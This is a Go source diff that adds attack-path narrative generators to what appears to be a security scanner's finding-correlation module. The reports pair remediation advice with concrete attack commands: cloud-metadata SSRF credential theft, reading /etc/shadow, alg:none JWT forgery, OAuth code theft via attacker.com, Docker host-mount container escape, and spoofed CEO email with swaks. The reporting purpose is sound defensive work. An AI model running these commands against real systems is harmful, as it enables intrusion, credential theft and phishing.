@@ -39,6 +39,26 @@ func GenerateNarrative(chainFinding finding.Finding, allFindings []finding.Findi
 		return narrativeDNSRebinding(chainFinding, allFindings)
 	case "correlation.auth_bypass_chain":
 		return narrativeAuthBypass(chainFinding, allFindings)
+	case "correlation.ssrf_cloud_iam_chain":
+		return narrativeSSRFCloudIAMEscalation(chainFinding, allFindings)
+	case "correlation.default_creds_rce_chain":
+		return narrativeDefaultCredsRCE(chainFinding, allFindings)
+	case "correlation.info_disclosure_lateral_chain":
+		return narrativeInfoDisclosureLateral(chainFinding, allFindings)
+	case "correlation.jwt_auth_bypass_chain":
+		return narrativeJWTAuthBypass(chainFinding, allFindings)
+	case "correlation.open_redirect_oauth_chain":
+		return narrativeOpenRedirectOAuth(chainFinding, allFindings)
+	case "correlation.subdomain_takeover_session_chain":
+		return narrativeSubdomainTakeoverSession(chainFinding, allFindings)
+	case "correlation.weak_tls_cred_intercept_chain":
+		return narrativeWeakTLSCredIntercept(chainFinding, allFindings)
+	case "correlation.container_escape_chain":
+		return narrativeContainerEscape(chainFinding, allFindings)
+	case "correlation.email_spoof_phish_chain":
+		return narrativeEmailSpoofPhish(chainFinding, allFindings)
+	case "correlation.version_cve_match_chain":
+		return narrativeVersionCVEMatch(chainFinding, allFindings)
 	default:
 		return narrativeGeneric(chainFinding, allFindings)
 	}
@@ -486,6 +506,449 @@ func narrativeAuthBypass(cf finding.Finding, all []finding.Finding) string {
 	fmt.Fprintf(&b, "2. Forge authentication token or craft bypass request\n")
 	fmt.Fprintf(&b, "3. Access `%s` as an authenticated user\n", service)
 	fmt.Fprintf(&b, "4. Create a backdoor account for persistence\n")
+
+	return b.String()
+}
+
+func narrativeSSRFCloudIAMEscalation(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	ssrfURL := evi(cf, "url", "https://"+asset+"/api/fetch")
+	param := evi(cf, "parameter", "url")
+	provider := evi(cf, "cloud_provider", "AWS")
+
+	metaEndpoint := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+	credCmd := "aws sts get-caller-identity && aws s3 ls && aws iam list-roles"
+	if strings.EqualFold(provider, "gcp") {
+		metaEndpoint = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+		credCmd = "gcloud auth list && gcloud projects list && gcloud iam roles list"
+	} else if strings.EqualFold(provider, "azure") {
+		metaEndpoint = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+		credCmd = "az account show && az role assignment list && az storage account list"
+	}
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: SSRF → Cloud Metadata → IAM Escalation to Cloud Admin\n\n")
+	fmt.Fprintf(&b, "**Impact:** Full %s cloud account compromise — attacker gains IAM credentials and escalates to cloud admin.\n\n", provider)
+
+	fmt.Fprintf(&b, "### Step 1: Server-Side Request Forgery\n")
+	fmt.Fprintf(&b, "The endpoint `%s` accepts a user-controlled `%s` parameter and fetches\n", ssrfURL, param)
+	fmt.Fprintf(&b, "arbitrary URLs from the server side without adequate validation.\n\n")
+	fmt.Fprintf(&b, "**Proof:** `curl '%s?%s=http://example.com'`\n\n", ssrfURL, param)
+
+	fmt.Fprintf(&b, "### Step 2: Cloud Metadata Service Access\n")
+	fmt.Fprintf(&b, "The SSRF reaches the %s instance metadata endpoint at\n", provider)
+	fmt.Fprintf(&b, "`%s`, which returns IAM role credentials.\n\n", metaEndpoint)
+	fmt.Fprintf(&b, "**Proof:** `curl '%s?%s=%s'`\n\n", ssrfURL, param, metaEndpoint)
+
+	fmt.Fprintf(&b, "### Step 3: IAM Credential Extraction\n")
+	fmt.Fprintf(&b, "The metadata response contains temporary credentials (AccessKeyId,\n")
+	fmt.Fprintf(&b, "SecretAccessKey, SessionToken) for the instance's IAM role.\n\n")
+
+	fmt.Fprintf(&b, "### Step 4: Cloud Privilege Escalation\n")
+	fmt.Fprintf(&b, "The attacker uses the stolen IAM credentials to enumerate cloud resources\n")
+	fmt.Fprintf(&b, "and escalate privileges — listing S3 buckets, databases, secrets, and\n")
+	fmt.Fprintf(&b, "potentially assuming more privileged roles.\n\n")
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Block SSRF by allowlisting permitted URL schemes and hosts\n")
+	fmt.Fprintf(&b, "- **Defense in depth:** Enable IMDSv2 (require token-based metadata requests)\n")
+	fmt.Fprintf(&b, "- **IAM hardening:** Apply least-privilege to instance roles; deny `iam:PassRole` and `sts:AssumeRole`\n")
+	fmt.Fprintf(&b, "- **Network:** Use VPC endpoints and security groups to restrict metadata access\n\n")
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. `curl '%s?%s=%s'` — discover IAM role\n", ssrfURL, param, metaEndpoint)
+	fmt.Fprintf(&b, "2. Parse AccessKeyId, SecretAccessKey, SessionToken from response\n")
+	fmt.Fprintf(&b, "3. `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...`\n")
+	fmt.Fprintf(&b, "4. `%s`\n", credCmd)
+	fmt.Fprintf(&b, "5. Escalate to admin via overly permissive role policies\n")
+
+	return b.String()
+}
+
+func narrativeDefaultCredsRCE(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	service := evi(cf, "service", "admin panel")
+	username := evi(cf, "username", "admin")
+	password := evi(cf, "password", "admin")
+	adminURL := evi(cf, "url", "https://"+asset+"/admin")
+	rceCheck := evi(cf, "rce_check", "CVE-XXXX-XXXXX")
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: Default Credentials → Admin Panel → Remote Code Execution\n\n")
+	fmt.Fprintf(&b, "**Impact:** Full server compromise — attacker gains shell access via default credentials and known RCE.\n\n")
+
+	fmt.Fprintf(&b, "### Step 1: Default Credentials\n")
+	fmt.Fprintf(&b, "The %s at `%s` accepts the default credentials `%s:%s`.\n", service, adminURL, username, password)
+	fmt.Fprintf(&b, "These credentials ship with the software and are documented publicly.\n\n")
+	fmt.Fprintf(&b, "**Proof:** `curl -u %s:%s '%s'`\n\n", username, password, adminURL)
+
+	fmt.Fprintf(&b, "### Step 2: Admin Panel Access\n")
+	fmt.Fprintf(&b, "Authenticated as admin, the attacker gains access to the full management\n")
+	fmt.Fprintf(&b, "interface including configuration, user management, and plugin/extension\n")
+	fmt.Fprintf(&b, "installation capabilities.\n\n")
+
+	fmt.Fprintf(&b, "### Step 3: Remote Code Execution\n")
+	fmt.Fprintf(&b, "A known RCE vulnerability (%s) exists on this host. With admin access,\n", rceCheck)
+	fmt.Fprintf(&b, "the attacker can exploit it for arbitrary command execution — installing\n")
+	fmt.Fprintf(&b, "backdoors, exfiltrating data, or pivoting to other systems.\n\n")
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Change all default credentials; enforce strong password policy\n")
+	fmt.Fprintf(&b, "- **Patch:** Apply vendor patches for the identified RCE vulnerability\n")
+	fmt.Fprintf(&b, "- **Network:** Restrict admin panel access to VPN/internal networks only\n")
+	fmt.Fprintf(&b, "- **Monitoring:** Alert on admin logins from unexpected IPs\n\n")
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. Navigate to `%s` and log in with `%s` / `%s`\n", adminURL, username, password)
+	fmt.Fprintf(&b, "2. Enumerate admin functionality for code execution vectors\n")
+	fmt.Fprintf(&b, "3. Exploit %s for shell access\n", rceCheck)
+	fmt.Fprintf(&b, "4. `id && whoami && cat /etc/shadow` — confirm host-level access\n")
+
+	return b.String()
+}
+
+func narrativeInfoDisclosureLateral(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	filePath := evi(cf, "path", "/.env")
+	snippet := evi(cf, "snippet", "DATABASE_URL=postgres://admin:p4ssw0rd@db.internal:5432/prod")
+	targetHost := evi(cf, "pivot_target", "db.internal")
+	targetPort := evi(cf, "pivot_port", "5432")
+	targetCheck := evi(cf, "target_check", "exposed database")
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: Information Disclosure → Credential Harvest → Lateral Movement\n\n")
+	fmt.Fprintf(&b, "**Impact:** Attacker harvests credentials from exposed config and pivots to the internal data tier.\n\n")
+
+	fmt.Fprintf(&b, "### Step 1: Configuration File Exposed\n")
+	fmt.Fprintf(&b, "The file `%s` on `%s` is publicly accessible and contains\n", filePath, asset)
+	fmt.Fprintf(&b, "service credentials:\n")
+	fmt.Fprintf(&b, "```\n%s\n```\n\n", snippet)
+	fmt.Fprintf(&b, "**Proof:** `curl -s 'https://%s%s'`\n\n", asset, filePath)
+
+	fmt.Fprintf(&b, "### Step 2: Credential Extraction\n")
+	fmt.Fprintf(&b, "The attacker parses the response for database URLs, API keys,\n")
+	fmt.Fprintf(&b, "cloud credentials, and internal service endpoints. Common patterns:\n")
+	fmt.Fprintf(&b, "- `DATABASE_URL`, `DB_PASSWORD`, `REDIS_URL`\n")
+	fmt.Fprintf(&b, "- `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`\n")
+	fmt.Fprintf(&b, "- `API_KEY`, `SECRET_KEY`, `JWT_SECRET`\n\n")
+
+	fmt.Fprintf(&b, "### Step 3: Lateral Movement to Data Tier\n")
+	fmt.Fprintf(&b, "Using extracted credentials, the attacker connects to the %s\n", targetCheck)
+	fmt.Fprintf(&b, "at `%s:%s`, accessing the internal data tier directly.\n\n", targetHost, targetPort)
+	fmt.Fprintf(&b, "**Proof:** `psql -h %s -p %s -U <user> <dbname>`\n\n", targetHost, targetPort)
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Remove or deny access to exposed configuration files\n")
+	fmt.Fprintf(&b, "- **Rotate:** Rotate all credentials found in the exposed file\n")
+	fmt.Fprintf(&b, "- **Network:** Restrict database access to application servers only (security groups/firewall)\n")
+	fmt.Fprintf(&b, "- **Secrets management:** Move credentials to a secrets manager (Vault, AWS Secrets Manager)\n\n")
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. `curl -s 'https://%s%s'` — fetch exposed config\n", asset, filePath)
+	fmt.Fprintf(&b, "2. Extract `DATABASE_URL` and parse host, port, username, password\n")
+	fmt.Fprintf(&b, "3. `psql -h %s -p %s -U <user> <dbname>` — connect to database\n", targetHost, targetPort)
+	fmt.Fprintf(&b, "4. `SELECT * FROM users LIMIT 10;` — exfiltrate data\n")
+
+	return b.String()
+}
+
+func narrativeJWTAuthBypass(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	weakness := evi(cf, "jwt_weakness", "weak algorithm")
+	url := evi(cf, "url", "https://"+asset+"/api")
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: JWT Weakness → Authentication Bypass → Sensitive Data Access\n\n")
+	fmt.Fprintf(&b, "**Impact:** Attacker forges JWT tokens to bypass authentication and access any API endpoint as any user.\n\n")
+
+	fmt.Fprintf(&b, "### Step 1: JWT Implementation Flaw\n")
+	fmt.Fprintf(&b, "The JWT implementation on `%s` has a critical weakness: **%s**.\n", asset, weakness)
+	fmt.Fprintf(&b, "This allows an attacker to create arbitrary valid tokens without the signing key.\n\n")
+
+	fmt.Fprintf(&b, "### Step 2: Token Forgery\n")
+	fmt.Fprintf(&b, "The attacker crafts a JWT with elevated claims:\n")
+	fmt.Fprintf(&b, "```json\n{\"sub\": \"admin\", \"role\": \"administrator\", \"iat\": 1700000000}\n```\n")
+	fmt.Fprintf(&b, "The token is accepted because the server does not properly validate the signature.\n\n")
+	fmt.Fprintf(&b, "**Proof:** `python3 -c \"import jwt; print(jwt.encode({'sub':'admin','role':'admin'}, '', algorithm='none'))\"`\n\n")
+
+	fmt.Fprintf(&b, "### Step 3: API Data Access\n")
+	fmt.Fprintf(&b, "With the forged admin token, the attacker accesses all protected API endpoints:\n")
+	fmt.Fprintf(&b, "- User data: `GET /api/users`\n")
+	fmt.Fprintf(&b, "- Admin functions: `POST /api/admin/settings`\n")
+	fmt.Fprintf(&b, "- Sensitive data: `GET /api/export/database`\n\n")
+	fmt.Fprintf(&b, "**Proof:** `curl -H 'Authorization: Bearer <forged_token>' '%s/api/admin/users'`\n\n", url)
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Enforce RS256 or ES256 algorithm validation; reject alg:none\n")
+	fmt.Fprintf(&b, "- **Key management:** Use strong, unique signing keys (min 256-bit)\n")
+	fmt.Fprintf(&b, "- **Validation:** Validate all JWT claims server-side (iss, aud, exp, nbf)\n")
+	fmt.Fprintf(&b, "- **Rotation:** Implement short token expiry with refresh token rotation\n\n")
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. Identify JWT weakness (e.g., accepts `alg: none`)\n")
+	fmt.Fprintf(&b, "2. Forge token: `{\"alg\":\"none\"}.{\"sub\":\"admin\",\"role\":\"admin\"}.`\n")
+	fmt.Fprintf(&b, "3. `curl -H 'Authorization: Bearer <token>' '%s/api/admin/users'`\n", url)
+	fmt.Fprintf(&b, "4. Extract sensitive data from API responses\n")
+
+	return b.String()
+}
+
+func narrativeOpenRedirectOAuth(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	redirectURL := evi(cf, "url", "https://"+asset+"/redirect")
+	redirectParam := evi(cf, "parameter", "url")
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: Open Redirect → OAuth Authorization Code Theft → Account Takeover\n\n")
+	fmt.Fprintf(&b, "**Impact:** Attacker steals OAuth tokens via open redirect on the callback domain — full account takeover.\n\n")
+
+	fmt.Fprintf(&b, "### Step 1: Open Redirect Vulnerability\n")
+	fmt.Fprintf(&b, "The endpoint `%s` redirects to any URL via the `%s` parameter\n", redirectURL, redirectParam)
+	fmt.Fprintf(&b, "without validation. Since it is on the same domain as the OAuth callback,\n")
+	fmt.Fprintf(&b, "it can be used as a redirect_uri that the OAuth provider trusts.\n\n")
+	fmt.Fprintf(&b, "**Proof:** `curl -sI '%s?%s=https://attacker.com'`\n\n", redirectURL, redirectParam)
+
+	fmt.Fprintf(&b, "### Step 2: OAuth Flow Hijack\n")
+	fmt.Fprintf(&b, "The attacker crafts an OAuth authorization URL that uses the open redirect\n")
+	fmt.Fprintf(&b, "as the `redirect_uri`. The OAuth provider validates the domain (which matches)\n")
+	fmt.Fprintf(&b, "but the path redirects the authorization code to the attacker's server.\n\n")
+
+	fmt.Fprintf(&b, "### Step 3: Token Exchange & Account Takeover\n")
+	fmt.Fprintf(&b, "The attacker's server receives the authorization code and exchanges it\n")
+	fmt.Fprintf(&b, "for access/refresh tokens, gaining full account access.\n\n")
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Fix the open redirect — allowlist valid redirect destinations\n")
+	fmt.Fprintf(&b, "- **OAuth:** Use exact redirect_uri matching (not prefix/domain matching)\n")
+	fmt.Fprintf(&b, "- **PKCE:** Enforce PKCE for all OAuth flows to prevent code interception\n")
+	fmt.Fprintf(&b, "- **State:** Validate the `state` parameter to prevent CSRF on OAuth callbacks\n\n")
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. Craft URL: `https://%s/oauth/authorize?client_id=...&redirect_uri=%s?%s=https://attacker.com/steal`\n", asset, redirectURL, redirectParam)
+	fmt.Fprintf(&b, "2. Send crafted URL to victim (phishing, social engineering)\n")
+	fmt.Fprintf(&b, "3. Victim authenticates; OAuth provider redirects to open redirect\n")
+	fmt.Fprintf(&b, "4. Open redirect forwards `?code=AUTH_CODE` to attacker's server\n")
+	fmt.Fprintf(&b, "5. Attacker exchanges code for tokens → full account access\n")
+
+	return b.String()
+}
+
+func narrativeSubdomainTakeoverSession(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	subdomain := evi(cf, "takeover_asset", "dangling."+asset)
+	provider := evi(cf, "cloud_provider", "cloud provider")
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: Subdomain Takeover → Parent-Domain Cookie Injection → Session Hijack\n\n")
+	fmt.Fprintf(&b, "**Impact:** Attacker claims abandoned subdomain and hijacks sessions on the main application.\n\n")
+
+	fmt.Fprintf(&b, "### Step 1: Dangling DNS Record\n")
+	fmt.Fprintf(&b, "The subdomain `%s` has a DNS record (CNAME/A) pointing to a %s\n", subdomain, provider)
+	fmt.Fprintf(&b, "resource that no longer exists. An attacker can claim this resource.\n\n")
+	fmt.Fprintf(&b, "**Proof:** `dig CNAME %s` — shows dangling record\n\n", subdomain)
+
+	fmt.Fprintf(&b, "### Step 2: Subdomain Claim\n")
+	fmt.Fprintf(&b, "The attacker registers the target resource with the %s and serves\n", provider)
+	fmt.Fprintf(&b, "their own content at `%s`. Browsers now trust this subdomain.\n\n", subdomain)
+
+	fmt.Fprintf(&b, "### Step 3: Cookie Injection for Parent Domain\n")
+	fmt.Fprintf(&b, "From the claimed subdomain, the attacker serves a page that sets cookies\n")
+	fmt.Fprintf(&b, "scoped to `.%s` (the parent domain):\n", asset)
+	fmt.Fprintf(&b, "```\nSet-Cookie: session=attacker_value; Domain=.%s; Path=/; Secure\n```\n", asset)
+	fmt.Fprintf(&b, "This overwrites or shadows the legitimate session cookie.\n\n")
+
+	fmt.Fprintf(&b, "### Step 4: Session Hijack on Main Application\n")
+	fmt.Fprintf(&b, "When the victim visits the main application at `%s`, the browser sends\n", asset)
+	fmt.Fprintf(&b, "the attacker-controlled cookie, allowing session fixation or hijacking.\n\n")
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Remove dangling DNS records for decommissioned services\n")
+	fmt.Fprintf(&b, "- **Cookies:** Use `__Host-` cookie prefix (prevents Domain attribute override)\n")
+	fmt.Fprintf(&b, "- **Monitoring:** Continuously monitor DNS records for dangling references\n")
+	fmt.Fprintf(&b, "- **HSTS:** Deploy HSTS with includeSubDomains to prevent downgrade attacks\n\n")
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. Discover dangling DNS: `dig CNAME %s`\n", subdomain)
+	fmt.Fprintf(&b, "2. Claim the %s resource for `%s`\n", provider, subdomain)
+	fmt.Fprintf(&b, "3. Serve page: `Set-Cookie: session=evil; Domain=.%s`\n", asset)
+	fmt.Fprintf(&b, "4. Victim visits `%s` → hijacked session\n", subdomain)
+	fmt.Fprintf(&b, "5. Victim's next request to `%s` uses attacker's cookie\n", asset)
+
+	return b.String()
+}
+
+func narrativeWeakTLSCredIntercept(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	tlsWeakness := evi(cf, "tls_weakness", "weak cipher suite")
+	authService := evi(cf, "auth_check", "login form")
+	url := evi(cf, "url", "https://"+asset)
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: Weak TLS → Man-in-the-Middle → Credential Interception\n\n")
+	fmt.Fprintf(&b, "**Impact:** Credentials transmitted to `%s` can be intercepted by a network attacker.\n\n", asset)
+
+	fmt.Fprintf(&b, "### Step 1: Weak TLS Configuration\n")
+	fmt.Fprintf(&b, "The server at `%s` supports %s, which is vulnerable to\n", asset, tlsWeakness)
+	fmt.Fprintf(&b, "known cryptographic attacks that allow connection downgrade or decryption.\n\n")
+	fmt.Fprintf(&b, "**Proof:** `testssl --vulnerable %s`\n\n", url)
+
+	fmt.Fprintf(&b, "### Step 2: Authentication Service Detected\n")
+	fmt.Fprintf(&b, "The service handles authentication (%s), meaning credentials\n", authService)
+	fmt.Fprintf(&b, "(usernames, passwords, session tokens) are transmitted over this connection.\n\n")
+
+	fmt.Fprintf(&b, "### Step 3: Man-in-the-Middle Credential Theft\n")
+	fmt.Fprintf(&b, "An attacker on the network path (same WiFi, ISP, BGP hijack) can:\n")
+	fmt.Fprintf(&b, "- Downgrade the TLS connection to exploit the weak configuration\n")
+	fmt.Fprintf(&b, "- Intercept credentials in transit\n")
+	fmt.Fprintf(&b, "- Replay stolen credentials for unauthorized access\n\n")
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1; enforce TLS 1.2+ only\n")
+	fmt.Fprintf(&b, "- **Ciphers:** Remove weak ciphers (RC4, DES, 3DES, export ciphers); prefer AEAD ciphers\n")
+	fmt.Fprintf(&b, "- **PFS:** Enable perfect forward secrecy (ECDHE key exchange)\n")
+	fmt.Fprintf(&b, "- **HSTS:** Deploy HSTS with long max-age to prevent protocol downgrade\n\n")
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. Position on network path (ARP spoofing, rogue WiFi, etc.)\n")
+	fmt.Fprintf(&b, "2. Force TLS downgrade to vulnerable protocol/cipher\n")
+	fmt.Fprintf(&b, "3. Intercept traffic to `%s` login endpoint\n", asset)
+	fmt.Fprintf(&b, "4. Extract credentials from decrypted traffic\n")
+	fmt.Fprintf(&b, "5. Replay credentials for authenticated access\n")
+
+	return b.String()
+}
+
+func narrativeContainerEscape(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	apiType := evi(cf, "api_check", "container orchestration API")
+	containerIssue := evi(cf, "container_check", "container vulnerability")
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: Exposed Container API → Container Escape → Host Compromise\n\n")
+	fmt.Fprintf(&b, "**Impact:** Full host compromise — attacker escapes container and controls all workloads on the host.\n\n")
+
+	fmt.Fprintf(&b, "### Step 1: Exposed Container Orchestration API\n")
+	fmt.Fprintf(&b, "The %s on `%s` is accessible without authentication,\n", apiType, asset)
+	fmt.Fprintf(&b, "allowing anyone to manage containers, deployments, and pods.\n\n")
+
+	fmt.Fprintf(&b, "### Step 2: Container Vulnerability\n")
+	fmt.Fprintf(&b, "The %s provides additional leverage — the attacker\n", containerIssue)
+	fmt.Fprintf(&b, "can deploy privileged containers or exploit existing weaknesses.\n\n")
+
+	fmt.Fprintf(&b, "### Step 3: Container Escape\n")
+	fmt.Fprintf(&b, "The attacker deploys a privileged container with the host filesystem mounted:\n")
+	fmt.Fprintf(&b, "```json\n{\"Image\": \"alpine\", \"HostConfig\": {\"Privileged\": true, \"Binds\": [\"/:/mnt\"]}}\n```\n")
+	fmt.Fprintf(&b, "This grants full read/write access to the host filesystem from within the container.\n\n")
+
+	fmt.Fprintf(&b, "### Step 4: Host Takeover\n")
+	fmt.Fprintf(&b, "From the host filesystem the attacker can:\n")
+	fmt.Fprintf(&b, "- Read `/etc/shadow` for password hashes\n")
+	fmt.Fprintf(&b, "- Install SSH keys for persistent access\n")
+	fmt.Fprintf(&b, "- Access secrets for all other containers on the host\n")
+	fmt.Fprintf(&b, "- Pivot to the container network and other hosts\n\n")
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Restrict container API access (require mTLS or firewall rules)\n")
+	fmt.Fprintf(&b, "- **RBAC:** Enforce Kubernetes RBAC; never expose kubelet or Docker API publicly\n")
+	fmt.Fprintf(&b, "- **Pod security:** Deny privileged containers and host mounts via PodSecurityPolicy/OPA\n")
+	fmt.Fprintf(&b, "- **Network:** Isolate container management plane from public networks\n\n")
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. Enumerate exposed API: `curl http://%s:2375/containers/json`\n", asset)
+	fmt.Fprintf(&b, "2. Deploy privileged container with host mount\n")
+	fmt.Fprintf(&b, "3. `chroot /mnt /bin/bash` — escape to host\n")
+	fmt.Fprintf(&b, "4. `cat /mnt/etc/shadow` — dump credentials\n")
+	fmt.Fprintf(&b, "5. Install persistence and pivot to other hosts\n")
+
+	return b.String()
+}
+
+func narrativeEmailSpoofPhish(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	spoofCheck := evi(cf, "spoof_check", "email.dmarc_missing")
+	dkimCheck := evi(cf, "dkim_check", "email.dkim_missing")
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: Email Spoofing → Phishing Campaign → Credential Harvest\n\n")
+	fmt.Fprintf(&b, "**Impact:** Attacker sends convincing phishing emails as `%s` — employees are tricked into revealing credentials.\n\n", asset)
+
+	fmt.Fprintf(&b, "### Step 1: Missing Email Authentication (DMARC/SPF)\n")
+	fmt.Fprintf(&b, "The domain `%s` lacks proper email authentication (%s).\n", asset, spoofCheck)
+	fmt.Fprintf(&b, "There is no DMARC policy to reject forged emails, and SPF is either missing\n")
+	fmt.Fprintf(&b, "or uses a soft-fail policy that does not block spoofed messages.\n\n")
+	fmt.Fprintf(&b, "**Proof:** `dig TXT _dmarc.%s` and `dig TXT %s`\n\n", asset, asset)
+
+	fmt.Fprintf(&b, "### Step 2: Missing DKIM Signature Validation\n")
+	fmt.Fprintf(&b, "DKIM is not configured (%s), so recipient mail servers cannot\n", dkimCheck)
+	fmt.Fprintf(&b, "verify that emails actually originated from `%s`. Forged emails appear\n", asset)
+	fmt.Fprintf(&b, "legitimate to both mail servers and end users.\n\n")
+	fmt.Fprintf(&b, "**Proof:** `dig TXT default._domainkey.%s`\n\n", asset)
+
+	fmt.Fprintf(&b, "### Step 3: Phishing Campaign\n")
+	fmt.Fprintf(&b, "The attacker sends emails that appear to come from `ceo@%s` or\n", asset)
+	fmt.Fprintf(&b, "`it-security@%s` containing:\n", asset)
+	fmt.Fprintf(&b, "- Urgent password reset links pointing to attacker-controlled pages\n")
+	fmt.Fprintf(&b, "- Fake internal announcements with credential harvesting forms\n")
+	fmt.Fprintf(&b, "- Malicious attachments disguised as company documents\n\n")
+
+	fmt.Fprintf(&b, "### Step 4: Credential Harvest → Internal Access\n")
+	fmt.Fprintf(&b, "Employees enter credentials on the phishing page, giving the attacker\n")
+	fmt.Fprintf(&b, "access to email, VPN, internal applications, and cloud services.\n\n")
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Publish DMARC with `p=reject` policy\n")
+	fmt.Fprintf(&b, "- **SPF:** Update SPF to `-all` (hard fail) and list only authorized senders\n")
+	fmt.Fprintf(&b, "- **DKIM:** Configure DKIM signing with 2048-bit keys for all outbound mail\n")
+	fmt.Fprintf(&b, "- **Training:** Conduct phishing awareness training for employees\n")
+	fmt.Fprintf(&b, "- **MFA:** Enforce MFA on all accounts to limit credential theft impact\n\n")
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. Confirm spoofability: `dig TXT _dmarc.%s` — no reject policy\n", asset)
+	fmt.Fprintf(&b, "2. `swaks --to victim@example.com --from ceo@%s --header 'Subject: Urgent Action Required'`\n", asset)
+	fmt.Fprintf(&b, "3. Email arrives in inbox (not spam) — no DMARC/DKIM rejection\n")
+	fmt.Fprintf(&b, "4. Employee clicks link → enters credentials on phishing page\n")
+	fmt.Fprintf(&b, "5. Attacker uses harvested credentials for internal access\n")
+
+	return b.String()
+}
+
+func narrativeVersionCVEMatch(cf finding.Finding, all []finding.Finding) string {
+	asset := cf.Asset
+	cveID := evi(cf, "cve_check", "CVE-XXXX-XXXXX")
+	cveSeverity := evi(cf, "cve_severity", "high")
+	service := evi(cf, "service", "detected service")
+	version := evi(cf, "version", "X.Y.Z")
+
+	var b strings.Builder
+	fmt.Fprintf(&b, "## Attack Path: Version Disclosure → Known CVE Match → Exploitation\n\n")
+	fmt.Fprintf(&b, "**Impact:** Service version exposed enables targeted exploitation of known vulnerability %s (%s severity).\n\n", cveID, cveSeverity)
+
+	fmt.Fprintf(&b, "### Step 1: Service Version Disclosure\n")
+	fmt.Fprintf(&b, "The %s on `%s` discloses its version (`%s`) via HTTP headers,\n", service, asset, version)
+	fmt.Fprintf(&b, "error pages, or banner information. This gives attackers exact version\n")
+	fmt.Fprintf(&b, "information to select matching exploits.\n\n")
+
+	fmt.Fprintf(&b, "### Step 2: CVE Identification\n")
+	fmt.Fprintf(&b, "Version `%s` matches the affected version range for **%s** (%s severity).\n", version, cveID, cveSeverity)
+	fmt.Fprintf(&b, "The vulnerability has known public exploits available.\n\n")
+
+	fmt.Fprintf(&b, "### Step 3: Targeted Exploitation\n")
+	fmt.Fprintf(&b, "The attacker uses the exact version information to select and configure\n")
+	fmt.Fprintf(&b, "the correct exploit, significantly increasing reliability compared to blind\n")
+	fmt.Fprintf(&b, "scanning. The version match confirms the target is vulnerable.\n\n")
+
+	fmt.Fprintf(&b, "### Remediation\n")
+	fmt.Fprintf(&b, "- **Immediate:** Patch the service to a version not affected by %s\n", cveID)
+	fmt.Fprintf(&b, "- **Headers:** Remove or obfuscate version information from HTTP headers and error pages\n")
+	fmt.Fprintf(&b, "- **WAF:** Deploy WAF rules for known exploit patterns\n")
+	fmt.Fprintf(&b, "- **Monitoring:** Monitor for exploitation attempts matching %s signatures\n\n", cveID)
+
+	fmt.Fprintf(&b, "### Combined Attack\n")
+	fmt.Fprintf(&b, "1. Identify version: response headers or error pages reveal `%s %s`\n", service, version)
+	fmt.Fprintf(&b, "2. Match to %s in vulnerability database\n", cveID)
+	fmt.Fprintf(&b, "3. Select matching exploit (Metasploit, nuclei template, or custom PoC)\n")
+	fmt.Fprintf(&b, "4. Execute exploit against `%s`\n", asset)
+	fmt.Fprintf(&b, "5. Achieve impact described in CVE advisory\n")
 
 	return b.String()
 }
